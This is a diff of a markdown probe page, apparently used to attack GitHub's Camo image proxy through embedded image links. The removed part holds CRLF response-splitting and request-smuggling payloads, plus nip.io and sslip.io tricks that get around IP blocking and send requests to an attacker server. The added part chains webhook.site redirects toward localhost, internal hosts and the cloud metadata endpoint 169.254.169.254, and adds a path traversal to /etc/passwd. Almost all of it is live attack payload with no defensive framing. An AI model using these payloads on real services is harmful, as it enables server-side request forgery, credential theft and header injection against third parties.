@@ -1,105 +1,70 @@
-# v47: nip.io Domain Bypass + CRLF Response Splitting
+# v48: Response Header & Redirect Chain Analysis
 
-> **KEY FINDING**: GitHub Camo BLOCKS direct IP addresses but allows domain names.
-> Using nip.io to create domains that resolve to our server: `164.90.187.218.nip.io`
-
----
-
-## 1. nip.io IP Bypass Tests
-
-### Basic - nip.io resolving to our server
-![nip test](http://164.90.187.218.nip.io:8888/nip-basic.gif)
-
-### CRLF Set-Cookie via nip.io
-![nip cookie](http://164.90.187.218.nip.io:8888/img.gif%0d%0aSet-Cookie:evil=1)
-
-### CRLF Content-Type via nip.io
-![nip ct](http://164.90.187.218.nip.io:8888/img.gif%0d%0aContent-Type:text/html)
-
-### CRLF Location redirect via nip.io
-![nip redir](http://164.90.187.218.nip.io:8888/img.gif%0d%0aLocation:http://evil.com)
-
-### Double CRLF body injection via nip.io
-![nip body](http://164.90.187.218.nip.io:8888/img.gif%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E)
+> **KEY FINDING from v47**: nip.io bypass works! Camo fetches from domain-based IPs.
+> Now testing: Do response headers or redirects get passed through?
 
 ---
 
-## 2. Alternative IP-to-Domain Services
+## 1. Redirect Chain Tests
 
-### sslip.io (another IP wildcard DNS)
-![sslip](http://164-90-187-218.sslip.io:8888/sslip-test.gif)
+### 301 Redirect (webhook.site supports this)
+![301](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-301.gif?redirect=true&status=301&to=https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/final-destination.gif)
 
-### xip.io (legacy, may still work)
-![xip](http://164.90.187.218.xip.io:8888/xip-test.gif)
+### 302 Redirect
+![302](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-302.gif?redirect=true&status=302&to=https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/final-302.gif)
 
----
+### External redirect to our server
+![ext-redir](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-external.gif?redirect=true&to=http://164.90.187.218.nip.io:8888/from-redirect.gif)
 
-## 3. HTTP Request Smuggling via Domain
+### Redirect to internal
+![int-redir](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-internal.gif?redirect=true&to=http://127.0.0.1:8080/)
 
-### CL.TE attempt via nip.io
-![smuggle1](http://164.90.187.218.nip.io:8888/img.gif%20HTTP/1.1%0d%0aHost:internal%0d%0aContent-Length:0%0d%0a%0d%0aGET%20/admin)
+### Redirect to localhost
+![local-redir](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-localhost.gif?redirect=true&to=http://localhost/)
 
-### Double Host header injection
-![dblhost](http://164.90.187.218.nip.io:8888/img.gif%0d%0aHost:evil.com)
+### Redirect to 169.254.169.254
+![aws-redir](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-aws.gif?redirect=true&to=http://169.254.169.254/latest/meta-data/)
 
-### X-Forwarded-Host injection
-![xfh](http://164.90.187.218.nip.io:8888/img.gif%0d%0aX-Forwarded-Host:127.0.0.1)
-
----
-
-## 4. Port Variations via nip.io
-
-### Port 80 (standard HTTP)
-![port80](http://164.90.187.218.nip.io/port80-test.gif)
-
-### Port 8080 (common alt port)
-![port8080](http://164.90.187.218.nip.io:8080/port8080-test.gif)
-
-### Port 443 as HTTP (not HTTPS)
-![port443http](http://164.90.187.218.nip.io:443/port443http.gif)
+### Redirect to internal hostname
+![internal-host](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-internal-host.gif?redirect=true&to=http://internal.github.com/)
 
 ---
 
-## 5. Subdomain Variations
+## 2. Content-Type Confusion
 
-### Subdomain before IP
-![subdom1](http://test.164.90.187.218.nip.io:8888/subdomain-test.gif)
+### HTML as image (will Camo serve it?)
+![html](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/html-test.html)
 
-### Multiple subdomains
-![subdom2](http://a.b.c.164.90.187.218.nip.io:8888/multi-subdomain.gif)
+### SVG via Camo
+![svg](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/test.svg)
 
-### Hyphenated IP format (sslip.io style)
-![hyphen](http://164-90-187-218.sslip.io:8888/hyphen-format.gif)
-
----
-
-## 6. Control Tests
-
-### Webhook.site control (should always work)
-![control](https://webhook.site/f9880a9d-a4ca-4ed8-a559-f066430098db/v47-control.gif)
-
-### HTTP webhook (vs HTTPS)
-![http-control](http://webhook.site/f9880a9d-a4ca-4ed8-a559-f066430098db/v47-http.gif)
+### JavaScript file (extension)
+![js](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/test.js)
 
 ---
 
-## 7. Advanced CRLF Payloads via nip.io
+## 3. Control Tests
 
-### Triple header injection
-![triple](http://164.90.187.218.nip.io:8888/x%0d%0aSet-Cookie:a=1%0d%0aSet-Cookie:b=2%0d%0aX-Custom:pwned)
+### Basic control (v48)
+![v48-control](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/v48-control.gif)
 
-### Cache-Control manipulation
-![cache](http://164.90.187.218.nip.io:8888/x%0d%0aCache-Control:no-store%0d%0aX-Cache-Status:bypass)
-
-### Access-Control (CORS) injection
-![cors](http://164.90.187.218.nip.io:8888/x%0d%0aAccess-Control-Allow-Origin:*)
-
-### Content-Disposition for download
-![download](http://164.90.187.218.nip.io:8888/x%0d%0aContent-Disposition:attachment;filename=evil.exe)
+### HTTP control
+![v48-http](http://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/v48-http.gif)
 
 ---
 
-**v47** - Testing nip.io IP bypass to use controlled server for CRLF response analysis
+## 4. Open Redirect via Camo URL?
 
-Server: `164.90.187.218:8888` (PH4N70M droplet)
-Logs: `/tmp/server.log`
+Camo URLs use format: `https://camo.githubusercontent.com/{hash}/{encoded_url}`
+
+Can we craft a Camo URL that redirects?
+
+### Direct Camo URL with redirect parameter
+![camo-redir](https://camo.githubusercontent.com/redirect?url=http://evil.com)
+
+### Camo URL path traversal attempt
+![camo-traversal](https://camo.githubusercontent.com/../../../etc/passwd)
+
+---
+
+**v48** - Testing redirect behavior and content-type handling
